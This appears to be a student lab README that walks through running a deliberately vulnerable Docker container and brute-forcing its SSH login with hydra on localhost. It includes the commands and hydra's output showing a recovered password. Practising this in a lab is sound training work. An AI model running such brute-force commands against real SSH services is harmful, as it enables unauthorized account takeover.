# Attack is the best defense

```bash
88                                88        88
88                                88        ""
88                                88
88,dPPYba,  ,adPPYYba,  ,adPPYba, 88   ,d8  88 8b,dPPYba,   ,adPPYb,d8
88P'    "8a ""     `Y8 a8"     "" 88 ,a8"   88 88P'   `"8a a8"    `Y88
88       88 ,adPPPPP88 8b         8888[     88 88       88 8b       88
88       88 88,    ,88 "8a,   ,aa 88`"Yba,  88 88       88 "8a,   ,d88
88       88 `"8bbdP"Y8  `"Ybbd8"' 88   `Y8a 88 88       88  `"YbbdP"Y8
                                                            aa,    ,88
                                                             "Y8bbdP"
```

# General

* Network basics
* Docker

# Environment

<!-- ubuntu -->
[![Ubuntu](https://img.shields.io/static/v1?label=&message=Ubuntu&color=E95420&logo=Ubuntu&logoColor=E95420&labelColor=2F333A)](https://ubuntu.com/) <!-- bash -->
[![Bash](https://img.shields.io/static/v1?label=&message=GNU%20Bash&color=4EAA25&logo=GNU%20Bash&logoColor=4EAA25&labelColor=2F333A)](https://www.gnu.org/software/bash/) <!-- vim -->
[![Vim](https://img.shields.io/static/v1?label=&message=Vim&color=019733&logo=Vim&logoColor=019733&labelColor=2F333A)](https://www.vim.org/) <!-- vs code -->
[![VS Code](https://img.shields.io/static/v1?label=&message=Visual%20Studio%20Code&color=5C2D91&logo=Visual%20Studio%20Code&logoColor=5C2D91&labelColor=2F333A)](https://code.visualstudio.com/)

* OS: ``ubuntu``
* Shell: ``bash``
* IDE: ``vim``, ``VS Code``
* ``ssh``
* ``tcpdump``
* ``hydra``
* ``telnet``
* ``docker``

## Brute attack force

Pull docker image

``docker pull sylvainkalache/264-1```

Run the image

```bash
ralex@ralex-nb:~$ docker run -p 2222:22 -d -ti sylvainkalache/264-1
f6e64ceecab2c913fac1a15f2f2f66669dac8fd6b8f9a563ae30810f19852719
```

```bash
ralex@ralex-nb:~$ docker ps
CONTAINER ID   IMAGE                  COMMAND                  CREATED              STATUS              PORTS                                   NAMES
f6e64ceecab2   sylvainkalache/264-1   "/bin/sh -c 'service…"   About a minute ago   Up About a minute   0.0.0.0:2222->22/tcp, :::2222->22/tcp   quizzical_curran
ralex@ralex-nb:~$ 
```

brute force docker with hydra

``hydra -l sylvain -P passlist.txt ssh://127.0.0.1:2222``

```bash
ralex@ralex-nb:~$ hydra -l sylvain -P passlist.txt ssh://127.0.0.1:2222
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-25 20:39:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
[DATA] attacking ssh://127.0.0.1:2222/
[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-25 20:39:27
ralex@ralex-nb:~$ 
```

## Author

<!-- twitter -->
[![Twitter](https://img.shields.io/twitter/follow/ralex_uy?style=social)](https://twitter.com/ralex_uy) <!-- linkedin --> [![Linkedin](https://img.shields.io/badge/LinkedIn-+21K-blue?style=social&logo=linkedin)](https://www.linkedin.com/in/ronald-rivero/) <!-- github --> [![Github](https://img.shields.io/github/followers/ralexrivero?style=social)](https://github.com/ralexrivero/) <!-- vagrant --> [![Vagrant](https://img.shields.io/static/v1?label=&message=Vagrant%20Profile&color=1868F2&logo=vagrant&labelColor=2F333A)](https://app.vagrantup.com/ralexrivero) <!-- docker --> [![Docker](https://img.shields.io/static/v1?label=&message=Docker%20Profile&color=2496ED&logo=Docker&labelColor=2F333A)](https://hub.docker.com/u/ralexrivero)